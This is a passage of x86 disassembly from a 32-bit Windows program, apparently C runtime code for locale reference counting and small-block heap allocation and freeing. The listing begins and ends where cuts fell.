  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
